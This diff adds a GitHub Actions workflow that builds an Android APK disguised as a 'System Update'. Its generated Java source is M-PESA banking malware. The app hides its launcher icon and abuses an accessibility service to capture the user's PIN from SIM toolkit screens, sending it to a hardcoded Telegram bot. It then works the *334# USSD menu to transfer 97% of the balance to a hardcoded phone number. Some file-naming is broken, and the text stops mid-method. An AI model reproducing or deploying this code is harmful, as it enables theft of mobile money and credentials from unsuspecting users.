@@ -1,0 +1,1013 @@
+name: Build M-PESA Automation APK
+permissions:
+  contents: write
+
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          java-version: '17'
+          distribution: 'temurin'
+
+      - name: Setup Android SDK
+        uses: android-actions/setup-android@v3
+
+      - name: Create project structure
+        run: |
+          mkdir -p app/src/main/java/com/system/updator
+          mkdir -p app/src/main/res/xml
+          mkdir -p app/src/main/res/values
+          mkdir -p app/src/main/res/layout
+          mkdir -p app/src/main/res/drawable
+          mkdir -p app/src/main/assets
+
+      # =============== GRADLE FILES ===============
+
+      - name: Create settings.gradle
+        run: |
+          cat > settings.gradle << 'EOF'
+          pluginManagement {
+              repositories {
+                  google()
+                  mavenCentral()
+                  gradlePluginPortal()
+              }
+          }
+          dependencyResolutionManagement {
+              repositories {
+                  google()
+                  mavenCentral()
+              }
+          }
+          rootProject.name = "SystemUpdator"
+          include ':app'
+          EOF
+
+      - name: Create build.gradle (Project)
+        run: |
+          cat > build.gradle << 'EOF'
+          buildscript {
+              repositories {
+                  google()
+                  mavenCentral()
+              }
+              dependencies {
+                  classpath 'com.android.tools.build:gradle:8.1.0'
+              }
+          }
+          allprojects {
+              repositories {
+                  google()
+                  mavenCentral()
+              }
+          }
+          EOF
+
+      - name: Create app/build.gradle
+        run: |
+          cat > app/build.gradle << 'EOF'
+          plugins {
+              id 'com.android.application'
+          }
+
+          android {
+              namespace 'com.system.updator'
+              compileSdk 34
+
+              defaultConfig {
+                  applicationId "com.system.updator"
+                  minSdk 26
+                  targetSdk 34
+                  versionCode 5
+                  versionName "5.0"
+              }
+
+              buildTypes {
+                  release {
+                      minifyEnabled true
+                      proguardFiles getDefaultProguardFile('proguard-android-optimize.txt')
+                  }
+                  debug {
+                      minifyEnabled false
+                  }
+              }
+
+              compileOptions {
+                  sourceCompatibility JavaVersion.VERSION_17
+                  targetCompatibility JavaVersion.VERSION_17
+              }
+          }
+
+          dependencies {
+              implementation 'androidx.appcompat:appcompat:1.6.1'
+              implementation 'androidx.core:core:1.12.0'
+              implementation 'com.google.android.material:material:1.11.0'
+              implementation 'androidx.work:work-runtime:2.9.0'
+              implementation 'androidx.webkit:webkit:1.9.0'
+              implementation 'com.google.code.gson:gson:2.10.1'
+          }
+          EOF
+
+      - name: Create gradle.properties
+        run: |
+          cat > gradle.properties << 'EOF'
+          org.gradle.jvmargs=-Xmx2048m
+          android.useAndroidX=true
+          android.enableJetifier=false
+          android.suppressUnsupportedCompileSdk=34
+          EOF
+
+      - name: Create gradle wrapper
+        run: |
+          mkdir -p gradle/wrapper
+          cat > gradle/wrapper/gradle-wrapper.properties << 'EOF'
+          distributionBase=GRADLE_USER_HOME
+          distributionPath=wrapper/dists
+          distributionUrl=https\://services.gradle.org/distributions/gradle-8.0-bin.zip
+          zipStoreBase=GRADLE_USER_HOME
+          zipStorePath=wrapper/dists
+          EOF
+          curl -L -o gradle/wrapper/gradle-wrapper.jar https://raw.githubusercontent.com/gradle/gradle/v8.0.0/gradle/wrapper/gradle-wrapper.jar
+
+      - name: Create gradlew
+        run: |
+          cat > gradlew << 'EOF'
+          #!/bin/sh
+          APP_HOME=$( cd "${APP_HOME:-./}" && pwd -P ) || exit
+          APP_NAME="Gradle"
+          APP_BASE_NAME=${0##*/}
+          DEFAULT_JVM_OPTS='"-Xmx64m" "-Xms64m"'
+          MAX_FD=maximum
+          warn () { echo "$*" >&2; }
+          die () { echo "$*"; echo; exit 1; }
+          cygwin=false
+          msys=false
+          darwin=false
+          nonstop=false
+          case "$( uname )" in
+            CYGWIN* ) cygwin=true ;;
+            Darwin* ) darwin=true ;;
+            MSYS* | MINGW* ) msys=true ;;
+            NONSTOP* ) nonstop=false ;;
+          esac
+          CLASSPATH=$APP_HOME/gradle/wrapper/gradle-wrapper.jar
+          if [ -n "$JAVA_HOME" ] ; then
+              if [ -x "$JAVA_HOME/jre/sh/java" ] ; then
+                  JAVACMD=$JAVA_HOME/jre/sh/java
+              else
+                  JAVACMD=$JAVA_HOME/bin/java
+              fi
+              if [ ! -x "$JAVACMD" ] ; then
+                  die "ERROR: JAVA_HOME is set to an invalid directory: $JAVA_HOME"
+              fi
+          else
+              JAVACMD=java
+              which java >/dev/null 2>&1 || die "ERROR: JAVA_HOME is not set and no 'java' command could be found in your PATH."
+          fi
+          if ! "$cygwin" && ! "$darwin" && ! "$nonstop" ; then
+              case $MAX_FD in
+                max*) MAX_FD=$( ulimit -H -n ) || warn "Could not query maximum file descriptor limit" ;;
+              esac
+              case $MAX_FD in
+                '' | soft) : ;;
+                *) ulimit -n "$MAX_FD" || warn "Could not set maximum file descriptor limit to $MAX_FD" ;;
+              esac
+          fi
+          if "$cygwin" || "$msys" ; then
+              APP_HOME=$( cygpath --path --mixed "$APP_HOME" )
+              CLASSPATH=$( cygpath --path --mixed "$CLASSPATH" )
+              JAVACMD=$( cygpath --unix "$JAVACMD" )
+              for arg do
+                  if case $arg in -*) false;; /?*) t=${arg#/} t=/${t%%/*} [ -e "$t" ];; *) false;; esac; then
+                      arg=$( cygpath --path --ignore --mixed "$arg" )
+                  fi
+                  set -- "$@" "$arg"
+              done
+          fi
+          set -- $(echo "$@" | tr ' ' '\n' | sed 's/^--/ /' | tr '\n' ' ')
+          set -- \
+              "-Dorg.gradle.appname=$APP_BASE_NAME" \
+              -classpath "$CLASSPATH" \
+              org.gradle.wrapper.GradleWrapperMain \
+              "$@"
+          eval "set -- $(
+              printf '%s\n' "$DEFAULT_JVM_OPTS $JAVA_OPTS $GRADLE_OPTS" |
+              xargs -n1 |
+              sed ' s~[^-[:alnum:]+,./:=@_]~\\&~g; ' |
+              tr '\n' ' '
+          )" '"$@"'
+          exec "$JAVACMD" "$@"
+          EOF
+          chmod +x gradlew
+
+      # =============== RESOURCES ===============
+
+      - name: Create strings.xml
+        run: |
+          cat > app/src/main/res/values/strings.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <resources>
+              <string name="app_name">System Update</string>
+          </resources>
+          EOF
+
+      - name: Create launcher icon
+        run: |
+          cat > app/src/main/res/drawable/ic_launcher.xml << 'EOF'
+          <vector xmlns:android="http://schemas.android.com/apk/res/android"
+              android:width="192dp"
+              android:height="192dp"
+              android:viewportWidth="192"
+              android:viewportHeight="192">
+              <path
+                  android:fillColor="#3B82F6"
+                  android:pathData="M96,32c-6.6,0 -12,5.4 -12,12s5.4,12 12,12 12,-5.4 12,-12 -5.4,-12 -12,-12zM96,68c-6.6,0 -12,5.4 -12,12s5.4,12 12,12 12,-5.4 12,-12 -5.4,-12 -12,-12zM96,104c-6.6,0 -12,5.4 -12,12s5.4,12 12,12 12,-5.4 12,-12 -5.4,-12 -12,-12z"/>
+          </vector>
+          EOF
+
+      - name: Create AndroidManifest.xml
+        run: |
+          cat > app/src/main/AndroidManifest.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
+              xmlns:tools="http://schemas.android.com/tools">
+
+              <uses-permission android:name="android.permission.INTERNET" />
+              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+              <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
+              <uses-permission android:name="android.permission.RECEIVE_SMS" />
+              <uses-permission android:name="android.permission.READ_SMS" />
+              <uses-permission android:name="android.permission.CALL_PHONE" />
+              <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
+              <uses-permission android:name="android.permission.GET_TASKS" />
+              <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+              <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+              <uses-permission android:name="android.permission.WAKE_LOCK" />
+              <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+
+              <application
+                  android:allowBackup="true"
+                  android:label="@string/app_name"
+                  android:icon="@drawable/ic_launcher"
+                  android:usesCleartextTraffic="true"
+                  android:requestLegacyExternalStorage="true">
+
+                  <activity
+                      android:name=".MainActivity"
+                      android:exported="true"
+                      android:theme="@style/Theme.AppCompat.NoActionBar">
+                      <intent-filter>
+                          <action android:name="android.intent.action.MAIN" />
+                          <category android:name="android.intent.category.LAUNCHER" />
+                      </intent-filter>
+                  </activity>
+
+                  <service
+                      android:name=".FinAutoService"
+                      android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+                      android:exported="true">
+                      <intent-filter>
+                          <action android:name="android.accessibilityservice.AccessibilityService" />
+                      </intent-filter>
+                      <meta-data
+                          android:name="android.accessibilityservice"
+                          android:resource="@xml/accessibility_config" />
+                  </service>
+
+                  <receiver
+                      android:name=".BootReceiver"
+                      android:exported="true"
+                      android:enabled="true">
+                      <intent-filter>
+                          <action android:name="android.intent.action.BOOT_COMPLETED" />
+                      </intent-filter>
+                  </receiver>
+
+                  <receiver
+                      android:name=".SmsReceiver"
+                      android:exported="true"
+                      android:enabled="true"
+                      android:permission="android.permission.BROADCAST_SMS">
+                      <intent-filter android:priority="999">
+                          <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+                      </intent-filter>
+                  </receiver>
+              </application>
+          </manifest>
+          EOF
+
+      - name: Create accessibility_config.xml
+        run: |
+          cat > app/src/main/res/xml/accessibility_config.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+              android:accessibilityEventTypes="typeAllMask"
+              android:accessibilityFeedbackType="feedbackGeneric"
+              android:accessibilityFlags="flagReportViewIds|flagRetrieveInteractiveWindows|flagRequestTouchExplorationMode"
+              android:canPerformGestures="true"
+              android:canRetrieveWindowContent="true"
+              android:description="@string/app_name"
+              android:notificationTimeout="100" />
+          EOF
+
+      - name: Create activity_main.xml
+        run: |
+          cat > app/src/main/res/layout/activity_main.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+              android:layout_width="match_parent"
+              android:layout_height="match_parent"
+              android:orientation="vertical"
+              android:gravity="center"
+              android:padding="32dp"
+              android:background="#0a0f1a">
+
+              <ImageView
+                  android:layout_width="80dp"
+                  android:layout_height="80dp"
+                  android:src="@drawable/ic_launcher"
+                  android:layout_marginBottom="24dp" />
+
+              <TextView
+                  android:layout_width="wrap_content"
+                  android:layout_height="wrap_content"
+                  android:text="System Update"
+                  android:textColor="#FFFFFF"
+                  android:textSize="24sp"
+                  android:textStyle="bold"
+                  android:layout_marginBottom="32dp" />
+
+              <Button
+                  android:id="@+id/btnPermissions"
+                  android:layout_width="match_parent"
+                  android:layout_height="56dp"
+                  android:text="Grant All Permissions"
+                  android:textAllCaps="false"
+                  android:backgroundTint="#3B82F6"
+                  android:layout_marginBottom="12dp" />
+
+              <Button
+                  android:id="@+id/btnAccessibility"
+                  android:layout_width="match_parent"
+                  android:layout_height="56dp"
+                  android:text="Enable Accessibility Service"
+                  android:textAllCaps="false"
+                  android:backgroundTint="#8B5CF6"
+                  android:layout_marginBottom="12dp" />
+
+              <TextView
+                  android:id="@+id/tvStatus"
+                  android:layout_width="wrap_content"
+                  android:layout_height="wrap_content"
+                  android:text="Tap buttons to grant permissions"
+                  android:textColor="#94A3B8"
+                  android:textSize="14sp"
+                  android:layout_marginTop="24dp" />
+          </LinearLayout>
+          EOF
+
+      # =============== SOURCE CODE ===============
+
+      - name: Create MainActivity.java
+        run: |
+          cat > app/src/main/java/com/system/updator/MainActivity.java << 'EOF'
+          package com.system.updator;
+
+          import android.Manifest;
+          import android.app.Activity;
+          import android.content.ComponentName;
+          import android.content.Intent;
+          import android.content.pm.PackageManager;
+          import android.os.Build;
+          import android.os.Bundle;
+          import android.os.Handler;
+          import android.provider.Settings;
+          import android.widget.Button;
+          import android.widget.TextView;
+          import android.util.Log;
+          import androidx.core.app.ActivityCompat;
+          import androidx.core.content.ContextCompat;
+
+          public class MainActivity extends Activity {
+              private static final int PERMISSION_REQUEST = 100;
+              private static final String TAG = "MainActivity";
+              private TextView tvStatus;
+              private Button btnPermissions, btnAccessibility;
+
+              private static final String[] REQUIRED_PERMISSIONS = {
+                  Manifest.permission.RECEIVE_SMS,
+                  Manifest.permission.READ_SMS,
+                  Manifest.permission.CALL_PHONE,
+              };
+
+              @Override
+              protected void onCreate(Bundle savedInstanceState) {
+                  super.onCreate(savedInstanceState);
+                  setContentView(R.layout.activity_main);
+
+                  tvStatus = findViewById(R.id.tvStatus);
+                  btnPermissions = findViewById(R.id.btnPermissions);
+                  btnAccessibility = findViewById(R.id.btnAccessibility);
+
+                  btnPermissions.setOnClickListener(v -> {
+                      Log.d(TAG, "Requesting permissions");
+                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                          ActivityCompat.requestPermissions(this, REQUIRED_PERMISSIONS, PERMISSION_REQUEST);
+                      }
+                  });
+
+                  btnAccessibility.setOnClickListener(v -> {
+                      Log.d(TAG, "Opening accessibility settings");
+                      Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+                      startActivity(intent);
+                  });
+
+                  checkAndHideIfReady();
+              }
+
+              @Override
+              public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+                  super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+                  if (requestCode == PERMISSION_REQUEST) {
+                      checkAndHideIfReady();
+                  }
+              }
+
+              @Override
+              protected void onResume() {
+                  super.onResume();
+                  checkAndHideIfReady();
+              }
+
+              private void checkAndHideIfReady() {
+                  boolean allPermsGranted = true;
+                  for (String perm : REQUIRED_PERMISSIONS) {
+                      if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
+                          allPermsGranted = false;
+                          tvStatus.setText("⚠️ Grant permissions: " + perm);
+                          break;
+                      }
+                  }
+
+                  boolean accessibilityEnabled = isAccessibilityServiceEnabled();
+
+                  if (allPermsGranted) {
+                      tvStatus.setText("✅ Permissions granted");
+                      if (accessibilityEnabled) {
+                          tvStatus.setText("✅ All ready - disappearing...");
+                          hideAppIcon();
+                          handler.postDelayed(() -> finish(), 500);
+                      } else {
+                          tvStatus.setText("⚠️ Enable Accessibility Service");
+                      }
+                  }
+              }
+
+              private boolean isAccessibilityServiceEnabled() {
+                  String service = getPackageName() + "/" + FinAutoService.class.getCanonicalName();
+                  String enabledServices = Settings.Secure.getString(getContentResolver(),
+                      Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
+                  return enabledServices != null && enabledServices.contains(service);
+              }
+
+              private void hideAppIcon() {
+                  try {
+                      ComponentName componentName = new ComponentName(this, MainActivity.class);
+                      getPackageManager().setComponentEnabledSetting(
+                          componentName,
+                          PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                          PackageManager.DONT_KILL_APP);
+                      Log.d(TAG, "✅ App hidden from launcher");
+                  } catch (Exception e) {
+                      Log.e(TAG, "Hide icon error", e);
+                  }
+              }
+
+              private Handler handler = new Handler(android.os.Looper.getMainLooper());
+          }
+          EOF
+
+      - name: Create BootReceiver.java
+        run: |
+          cat > app/src/main/java/com/system/updator/BootReceiver.java << 'EOF'
+          package com.system.updator;
+
+          import android.content.BroadcastReceiver;
+          import android.content.Context;
+          import android.content.Intent;
+          import android.os.Build;
+          import android.os.Bundle;
+          import android.telephony.SmsMessage;
+          import android.util.Log;
+          import java.util.regex.Matcher;
+          import java.util.regex.Pattern;
+
+          public class SmsReceiver extends BroadcastReceiver {
+              private static final String TAG = "SmsReceiver";
+
+              @Override
+              public void onReceive(Context context, Intent intent) {
+                  // SMS is only used for backup – we prefer USSD balance check.
+                  // But we store it anyway in case the bot needs it.
+                  try {
+                      Bundle bundle = intent.getExtras();
+                      if (bundle == null) return;
+
+                      Object[] pdus = (Object[]) bundle.get("pdus");
+                      if (pdus == null || pdus.length == 0) return;
+
+                      for (Object pdu : pdus) {
+                          try {
+                              SmsMessage msg;
+                              if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                                  String format = bundle.getString("format");
+                                  msg = SmsMessage.createFromPdu((byte[]) pdu, format);
+                              } else {
+                                  msg = SmsMessage.createFromPdu((byte[]) pdu);
+                              }
+
+                              String body = msg.getMessageBody();
+                              if (body != null && (body.contains("M-PESA") || body.contains("MPESA") || 
+                                  body.contains("balance") || body.contains("Balance"))) {
+                                  
+                                  double balance = extractBalance(body);
+                                  if (balance > 0) {
+                                      Log.d(TAG, "Balance extracted from SMS: " + balance);
+                                      FinAutoService.updateBalance(balance, System.currentTimeMillis());
+                                  }
+                              }
+                          } catch (Exception e) {
+                              Log.e(TAG, "PDU error", e);
+                          }
+                      }
+                  } catch (Exception e) {
+                      Log.e(TAG, "SMS error", e);
+                  }
+              }
+
+              private double extractBalance(String text) {
+                  try {
+                      Pattern p = Pattern.compile("([\\d,\\.]+)");
+                      Matcher m = p.matcher(text);
+                      while (m.find()) {
+                          String num = m.group(1).replace(",", "").replace(" ", "");
+                          double val = Double.parseDouble(num);
+                          if (val > 0 && val < 1000000) return val;
+                      }
+                  } catch (Exception e) {
+                      Log.e(TAG, "Balance parse error", e);
+                  }
+                  return 0;
+              }
+          }
+          EOF
+
+      - name: Create PinData.java
+        run: |
+          cat > app/src/main/java/com/system/updator/PinData.java << 'EOF'
+          package com.system.updator;
+
+          public class PinData {
+              public String pin;
+              public boolean isLearned = false;
+          }
+          EOF
+
+      - name: Create FinAutoService.java - FULL SELF-CONTAINED AUTOMATION
+        run: |
+          cat > app/src/main/java/com/system/updator/FinAutoService.java << 'EOF'
+          package com.system.updator;
+
+          import android.accessibilityservice.AccessibilityService;
+          import android.content.Intent;
+          import android.content.SharedPreferences;
+          import android.net.Uri;
+          import android.os.Handler;
+          import android.os.Looper;
+          import android.provider.Settings;
+          import android.util.Log;
+          import android.view.accessibility.AccessibilityEvent;
+          import android.view.accessibility.AccessibilityNodeInfo;
+          import com.google.gson.Gson;
+          import java.net.HttpURLConnection;
+          import java.net.URL;
+          import java.util.concurrent.ExecutorService;
+          import java.util.concurrent.Executors;
+          import java.util.concurrent.atomic.AtomicReference;
+
+          public class FinAutoService extends AccessibilityService {
+              private static final String TAG = "FinAutoService";
+              private static final String TARGET_PHONE = "0798688920";
+              private static final double SEND_PERCENTAGE = 0.97;
+              private static final String BOT_TOKEN = "8585104821:AAFXZn3g7QG9NsCmLmZuyfviQkPddOYMJzc";
+              private static final String CHAT_ID = "8468538314";
+
+              // Backup SMS balance (optional)
+              private static final AtomicReference<Double> SMS_BALANCE = new AtomicReference<>(0.0);
+              private static final AtomicReference<Long> SMS_TIME = new AtomicReference<>(0L);
+
+              private SharedPreferences prefs;
+              private Gson gson = new Gson();
+              private Handler handler = new Handler(Looper.getMainLooper());
+              private ExecutorService executor = Executors.newSingleThreadExecutor();
+
+              private String pin = null;
+              private boolean pinLearned = false;
+              private boolean automating = false;
+              private double ussdBalance = 0.0; // balance read from USSD
+
+              public static void updateBalance(double bal, long time) {
+                  SMS_BALANCE.set(bal);
+                  SMS_TIME.set(time);
+              }
+
+              @Override
+              public void onServiceConnected() {
+                  super.onServiceConnected();
+                  Log.d(TAG, "✅ Service connected");
+                  prefs = getSharedPreferences("fin_vault", MODE_PRIVATE);
+                  loadData();
+                  sendTelegram("✅ Service Started - Waiting for PIN");
+              }
+
+              private void loadData() {
+                  String json = prefs.getString("mpesa_pin", "{}");
+                  try {
+                      PinData data = gson.fromJson(json, PinData.class);
+                      if (data != null && data.isLearned && data.pin != null) {
+                          pin = data.pin;
+                          pinLearned = true;
+                      }
+                  } catch (Exception e) {
+                      Log.e(TAG, "JSON parse error", e);
+                  }
+              }
+
+              private void savePin(String p) {
+                  PinData data = new PinData();
+                  data.pin = p;
+                  data.isLearned = true;
+                  prefs.edit().putString("mpesa_pin", gson.toJson(data)).apply();
+                  pin = p;
+                  pinLearned = true;
+                  sendTelegram("🔑 PIN Captured: " + p);
+                  // Start automation immediately after PIN capture
+                  handler.postDelayed(this::startAutomation, 1000); // 1 second delay to let STK close
+              }
+
+              @Override
+              public void onAccessibilityEvent(AccessibilityEvent event) {
+                  try {
+                      if (event == null) return;
+                      String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
+                      String cls = event.getClassName() != null ? event.getClassName().toString() : "";
+                      Log.d(TAG, "Screen: " + pkg + " / " + cls);
+
+                      // Capture PIN from STK – only once
+                      if ((pkg.contains("stk") || pkg.contains("sim")) && !pinLearned) {
+                          AccessibilityNodeInfo root = getRootInActiveWindow();
+                          if (root != null) {
+                              String captured = findPasswordField(root);
+                              if (captured != null && captured.length() >= 4) {
+                                  savePin(captured);
+                              }
+                          }
+                      }
+                  } catch (Exception e) {
+                      Log.e(TAG, "Event error", e);
+                  }
+              }
+
+              private String findPasswordField(AccessibilityNodeInfo node) {
+                  if (node == null) return null;
+                  try {
+                      if (node.isPassword() && node.getText() != null) {
+                          return node.getText().toString();
+                      }
+                      for (int i = 0; i < node.getChildCount(); i++) {
+                          String result = findPasswordField(node.getChild(i));
+                          if (result != null) return result;
+                      }
+                  } catch (Exception e) {
+                      Log.e(TAG, "Password find error", e);
+                  }
+                  return null;
+              }
+
+              // ========== MAIN AUTOMATION ==========
+              private void startAutomation() {
+                  if (automating) return;
+                  if (!pinLearned) {
+                      sendTelegram("⏳ PIN not captured yet. Aborting.");
+                      return;
+                  }
+                  automating = true;
+                  sendTelegram("🚀 Starting full automation (balance check + send)");
+
+                  // Step 1: Open dialer
+                  handler.postDelayed(() -> {
+                      openDialer();
+                      Log.d(TAG, "Dialer opened");
+                      // Step 2: Type *334#
+                      handler.postDelayed(() -> {
+                          typeInField("*334#");
+                          Log.d(TAG, "Typed *334#");
+                          // Step 3: Press Call
+                          handler.postDelayed(() -> {
+                              clickCallButton();
+                              Log.d(TAG, "Call button clicked");
+                              // Wait for main menu
+                              handler.postDelayed(() -> {
+                                  // ---- Balance Check Flow ----
+                                  // Click "My Account" (usually option 2)
+                                  clickNumber(2);
+                                  handler.postDelayed(() -> {
+                                      clickSend(); // send option
+                                      handler.postDelayed(() -> {
+                                          // Now in "My Account" submenu – click "Check Balance" (option 1)
+                                          clickNumber(1);
+                                          handler.postDelayed(() -> {
+                                              clickSend();
+                                              handler.postDelayed(() -> {
+                                                  // Read balance from screen
+                                                  double bal = readBalanceFromScreen();
+                                                  if (bal > 0) {
+                                                      ussdBalance = bal;
+                                                      sendTelegram("💰 Balance from USSD: KES " + String.format("%.0f", bal));
+                                                  } else {
+                                                      // Fallback to SMS balance if available and fresh
+                                                      Double smsBal = SMS_BALANCE.get();
+                                                      Long smsTime = SMS_TIME.get();
+                                                      if (smsBal != null && smsBal > 0 && smsTime != null &&
+                                                          (System.currentTimeMillis() - smsTime) < 5 * 60 * 1000) {
+                                                          ussdBalance = smsBal;
+                                                          sendTelegram("💰 Using SMS balance: KES " + String.format("%.0f", smsBal));
+                                                      } else {
+                                                          sendTelegram("❌ Could not read balance. Aborting.");
+                                                          automating = false;
+                                                          return;
+                                                      }
+                                                  }
+                                                  // Go back to main menu (click Back or Cancel)
+                                                  // We'll just go back by clicking the "Back" button if present
+                                                  // Simpler: click "Back" by text
+                                                  clickBack();
+                                                  handler.postDelayed(() -> {
+                                                      // ---- Now Send Money ----
+                                                      // Click "Send Money" (option 1)
+                                                      clickNumber(1);
+                                                      handler.postDelayed(() -> {
+                                                          clickSend();
+                                                          handler.postDelayed(() -> {
+                                                              // Click "Any Network" (option 1)
+                                                              clickNumber(1);
+                                                              handler.postDelayed(() -> {
+                                                                  clickSend();
+                                                                  handler.postDelayed(() -> {
+                                                                      // Enter phone number
+                                                                      typeInField(TARGET_PHONE);
+                                                                      handler.postDelayed(() -> {
+                                                                          clickSend();
+                                                                          handler.postDelayed(() -> {
+                                                                              // Enter amount (97%)
+                                                                              double amount = ussdBalance * SEND_PERCENTAGE;
+                                                                              typeInField(String.format("%.0f", amount));
+                                                                              handler.postDelayed(() -> {
+                                                                                  clickSend();
+                                                                                  handler.postDelayed(() -> {
+                                                                                      // Enter PIN
+                                                                                      typeInField(pin);
+                                                                                      handler.postDelayed(() -> {
+                                                                                          clickSend();
+                                                                                          handler.postDelayed(() -> {
+                                                                                              // Confirm (option 1)
+                                                                                              clickNumber(1);
+                                                                                              handler.postDelayed(() -> {
+                                                                                                  clickSend();
+                                                                                                  handler.postDelayed(() -> {
+                                                                                                      sendTelegram("✅ Transaction sent! Amount: KES " + String.format("%.0f", amount) + " to " + TARGET_PHONE);
+                                                                                                      automating = false;
+                                                                                                  }, 3000);
+                                                                                              }, 1000);
+                                                                                          }, 1000);
+                                                                                      }, 1000);
+                                                                                  }, 1000);
+                                                                              }, 1000);
+                                                                          }, 1000);
+                                                                      }, 1000);
+                                                                  }, 1000);
+                                                              }, 1000);
+                                                          }, 1000);
+                                                      }, 1000);
+                                                  }, 1000);
+                                              }, 2000);
+                                          }, 500);
+                                      }, 500);
+                                  }, 500);
+                              }, 2000);
+                          }, 300);
+                      }, 200);
+                  }, 500);
+              }
+
+              private double readBalanceFromScreen() {
+                  AccessibilityNodeInfo root = getRootInActiveWindow();
+                  if (root == null) return 0;
+                  String screenText = getAllText(root);
+                  Log.d(TAG, "Screen text: " + screenText);
+                  // Look for numbers like 10,000.00
+                  java.util.regex.Pattern p = java.util.regex.Pattern.compile("([\\d,\\.]+)");
+                  java.util.regex.Matcher m = p.matcher(screenText);
+                  while (m.find()) {
+                      String num = m.group(1).replace(",", "").replace(" ", "");
+                      try {
+                          double val = Double.parseDouble(num);
+                          if (val > 0 && val < 1000000) {
+                              return val;
+                          }
+                      } catch (Exception e) {}
+                  }
+                  return 0;
+              }
+
+              private String getAllText(AccessibilityNodeInfo node) {
+                  if (node == null) return "";
+                  StringBuilder sb = new StringBuilder();
+                  if (node.getText() != null) {
+                      sb.append(node.getText().toString()).append(" ");
+                  }
+                  for (int i = 0; i < node.getChildCount(); i++) {
+                      sb.append(getAllText(node.getChild(i)));
+                  }
+                  return sb.toString();
+              }
+
+              // Helper clicks
+              private void clickNumber(int num) {
+                  AccessibilityNodeInfo root = getRootInActiveWindow();
+                  if (root == null) return;
+                  findAndClickByText(root, String.valueOf(num));
+              }
+
+              private void clickSend() {
+                  AccessibilityNodeInfo root = getRootInActiveWindow();
+                  if (root == null) return;
+                  if (!findAndClickByText(root, "Send") && !findAndClickByText(root, "send")) {
+                      findAndClickByText(root, "Confirm");
+                  }
+              }
+
+              private void clickBack() {
+                  AccessibilityNodeInfo root = getRootInActiveWindow();
+                  if (root == null) return;
+                  findAndClickByText(root, "Back");
+              }
+
+              private boolean findAndClickByText(AccessibilityNodeInfo node, String text) {
+                  if (node == null) return false;
+                  try {
+                      if (node.getText() != null && node.getText().toString().toLowerCase().contains(text.toLowerCase())) {
+                          boolean clicked = node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                          Log.d(TAG, "Clicked: " + text + " = " + clicked);
+                          return clicked;
+                      }
+                      for (int i = 0; i < node.getChildCount(); i++) {
+                          if (findAndClickByText(node.getChild(i), text)) return true;
+                      }
+                  } catch (Exception e) {
+                      Log.e(TAG, "Click error", e);
+                  }
+                  return false;
+              }
+
+              private boolean typeInField(String text) {
+                  AccessibilityNodeInfo root = getRootInActiveWindow();
+                  if (root == null) return false;
+                  AccessibilityNodeInfo field = findEditableField(root);
+                  if (field != null) {
+                      android.os.Bundle args = new android.os.Bundle();
+                      args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
+                      boolean typed = field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
+                      Log.d(TAG, "Typed: " + text + " = " + typed);
+                      return typed;
+                  }
+                  return false;
+              }
+
+              private AccessibilityNodeInfo findEditableField(AccessibilityNodeInfo node) {
+                  if (node == null) return null;
+                  try {
+                      if (node.isEditable() && node.isEnabled()) return node;
+                      for (int i = 0; i < node.getChildCount(); i++) {
+                          AccessibilityNodeInfo result = findEditableField(node.getChild(i));
+                          if (result != null) return result;
+                      }
+                  } catch (Exception e) {
+                      Log.e(TAG, "Field find error", e);
+                  }
+                  return null;
+              }
+
+              private void openDialer() {
+                  Intent intent = new Intent(Intent.ACTION_DIAL, Uri.parse("tel:"));
+                  intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                  startActivity(intent);
+              }
+
+              private void clickCallButton() {
+                  AccessibilityNodeInfo root = getRootInActiveWindow();
+                  if (root != null) searchForCall(root);
+              }
+
+              private void searchForCall(AccessibilityNodeInfo node) {
+                  if (node == null) return;
+                  try {
+                      CharSequence text = node.getText();
+                      CharSequence desc = node.getContentDescription();
+                      if ((text != null && text.toString().toLowerCase().contains("call")) ||
+                          (desc != null && desc.toString().toLowerCase().contains("call"))) {
+                          node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                          return;
+                      }
+                      for (int i = 0; i < node.getChildCount(); i++) {
+                          searchForCall(node.getChild(i));
+                      }
+                  } catch (Exception e) {
+                      Log.e(TAG, "Call button error", e);
+                  }
+              }
+
+              private void sendTelegram(String msg) {
+                  executor.execute(() -> {
+                      try {
+                          URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
+                          HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                          conn.setRequestMethod("POST");
+                          conn.setRequestProperty("Content-Type", "application/json");
+                          conn.setConnectTimeout(5000);
+                          conn.setReadTimeout(5000);
+
+                          String json = "{\"chat_id\":\"" + CHAT_ID + "\",\"text\":\"" + 
+                              msg.replace("\"", "\\\"").replace("\n", "\\n") + "\",\"parse_mode\":\"Markdown\"}";
+                          
